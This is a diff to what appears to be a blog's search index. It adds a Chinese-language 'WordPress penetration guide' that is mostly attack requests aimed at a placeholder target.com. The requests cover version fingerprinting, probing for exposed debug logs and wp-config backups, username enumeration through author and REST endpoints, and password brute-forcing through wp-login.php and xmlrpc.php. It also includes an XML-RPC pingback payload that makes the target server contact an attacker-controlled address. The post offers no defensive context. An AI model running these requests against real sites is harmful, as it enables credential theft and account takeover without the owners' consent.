@@ -16265,4 +16265,72 @@ mysqldump <span class="token punctuation">[</span>选项<span class="token punct
 <p>发包就可在根目录写入a.php</p>
 ]]></content>
   </entry>
+  <entry>
+    <title>Wordpress渗透指南</title>
+    <url>/2022/09/19/wordpress-shen-tou-zhi-nan/wordpress-shen-tou-zhi-nan/</url>
+    <content><![CDATA[<h2 id="如何挖掘Wordpress网站的漏洞"><a href="#如何挖掘Wordpress网站的漏洞" class="headerlink" title="如何挖掘Wordpress网站的漏洞"></a>如何挖掘Wordpress网站的漏洞</h2><p>如果您访问<a href="https://target.com并查看源代码,您将看到来自/">https://target.com并查看源代码，您将看到来自</a> WordPress 的主题和插件的链接。</p>
+<p>或者你可以访问<a href="https://target.com/wp-login.php%EF%BC%8C%E5%AE%83%E6%98%AF">https://target.com/wp-login.php，它是</a> WordPress 登录管理页面</p>
+<p>通过查看核心、插件和主题版本找到相关的CVE</p>
+<h2 id="如何找到wordpress版本"><a href="#如何找到wordpress版本" class="headerlink" title="如何找到wordpress版本"></a>如何找到wordpress版本</h2><pre><code>https://target.com/feed 
+https://target.com/?feed=rss2</code></pre>
+<h2 id="如何找到插件版本"><a href="#如何找到插件版本" class="headerlink" title="如何找到插件版本"></a>如何找到插件版本</h2><pre><code>https://target.com/wp-content/plugins/PLUGINNAME/readme.txt
+https://target.com/wp-content/plugins/PLUGINNAME/readme.TXT
+https://target.com/wp-content/plugins/PLUGINNAME/README.txt
+https://target.com/wp-content/plugins/PLUGINNAME/README.TXT</code></pre>
+<h2 id="如何找到主题版本"><a href="#如何找到主题版本" class="headerlink" title="如何找到主题版本"></a>如何找到主题版本</h2><pre><code>https://target.com/wp-content/themes/THEMENAME/style.css 
+https://target.com/wp-content/themes/THEMENAME/readme.txt (If they have readme file)</code></pre>
+<p>如果您发现过时的核心/插件/主题，请在<a href="https://wpscan.com找到漏洞利用/">https://wpscan.com找到漏洞利用</a></p>
+<h2 id="查找日志文件"><a href="#查找日志文件" class="headerlink" title="查找日志文件"></a>查找日志文件</h2><pre><code>http://target.com/wp-content/debug.log</code></pre>
+<h2 id="查找备份文件-wp-config"><a href="#查找备份文件-wp-config" class="headerlink" title="查找备份文件 wp-config"></a>查找备份文件 wp-config</h2><pre><code>http://target.com/.wp-config.php.swp
+http://target.com/wp-config.inc
+http://target.com/wp-config.old
+http://target.com/wp-config.txt
+http://target.com/wp-config.html
+http://target.com/wp-config.php.bak
+http://target.com/wp-config.php.dist
+http://target.com/wp-config.php.inc
+http://target.com/wp-config.php.old
+http://target.com/wp-config.php.save
+http://target.com/wp-config.php.swp
+http://target.com/wp-config.php.txt
+http://target.com/wp-config.php.zip
+http://target.com/wp-config.php.html
+http://target.com/wp-config.php~</code></pre>
+<h2 id="获取网站上的用户名"><a href="#获取网站上的用户名" class="headerlink" title="获取网站上的用户名"></a>获取网站上的用户名</h2><pre><code>http://target.com/?author=1</code></pre>
+<p>或者</p>
+<pre><code>http://target.com/wp-json/wp/v2/users http://target.com/?rest_route=/wp/v2/users</code></pre>
+<h2 id="爆破后台账号密码"><a href="#爆破后台账号密码" class="headerlink" title="爆破后台账号密码"></a>爆破后台账号密码</h2><pre class=" language-AB"><code class="language-AB">POST /wp-login.php HTTP/1.1
+Host: target.com
+
+log=admin&pwd=BRUTEFORCE_IN_HERE&wp-submit=Log+In&redirect_to=http%3A%2F%2Ftarget.com%2Fwp-admin%</code></pre>
+<p>or</p>
+<pre><code>POST /xmlrpc.php HTTP/1.1
+Host: target.com
+
+&lt;?xml version="1.0" encoding="UTF-8"?&gt;
+&lt;methodCall&gt; 
+&lt;methodName&gt;wp.getUsersBlogs&lt;/methodName&gt; 
+&lt;params&gt; 
+&lt;param&gt;&lt;value&gt;admin&lt;/value&gt;&lt;/param&gt; 
+&lt;param&gt;&lt;value&gt;BRUTEFORCE_IN_HERE&lt;/value&gt;&lt;/param&gt; 
+&lt;/params&gt; 
+&lt;/methodCall&gt;</code></pre>
+<h2 id="wordpress-中的-XSPA"><a href="#wordpress-中的-XSPA" class="headerlink" title="wordpress 中的 XSPA"></a>wordpress 中的 XSPA</h2><pre><code>POST /xmlrpc.php HTTP/1.1
+Host: target.com
+
+&lt;methodCall&gt;
+&lt;methodName&gt;pingback.ping&lt;/methodName&gt;
+&lt;params&gt;&lt;param&gt;
+&lt;value&gt;&lt;string&gt;http://yourip:port&lt;/string&gt;&lt;/value&gt;
+&lt;/param&gt;&lt;param&gt;
+&lt;value&gt;
+&lt;string&gt;https://target.com&gt;&lt;/string&gt;
+&lt;/value&gt;
+&lt;/param&gt;&lt;/params&gt;
+&lt;/methodCall&gt;</code></pre>
+<h2 id="注册启用"><a href="#注册启用" class="headerlink" title="注册启用"></a>注册启用</h2><pre><code>http://example.com/wp-login.php?action=register</code></pre>
+<p>来源</p>
+<p><a href="https://mp.weixin.qq.com/s/kJDo2725ztlAO2HCnANOlg">https://mp.weixin.qq.com/s/kJDo2725ztlAO2HCnANOlg</a></p>
+]]></content>
+  </entry>
 </search>
